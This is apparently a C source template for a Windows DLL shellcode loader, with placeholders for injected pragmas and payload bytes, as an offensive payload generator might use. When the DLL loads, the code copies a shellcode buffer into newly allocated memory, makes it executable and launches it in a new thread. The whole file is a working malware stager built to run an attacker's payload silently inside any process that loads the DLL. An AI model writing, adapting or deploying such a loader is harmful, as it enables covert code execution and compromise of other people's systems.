{PRAGMA_COMMENTS}

#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        unsigned char buf[] = "{PAYLOAD_DATA}";
        size_t size = sizeof(buf);
        void* exec = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (exec)
        {
            memcpy(exec, buf, size);
            DWORD oldProtect;
            VirtualProtect(exec, size, PAGE_EXECUTE_READ, &oldProtect);
            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
		    if (hThread)
		    {
			    CloseHandle(hThread);
		    }
        }
    }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
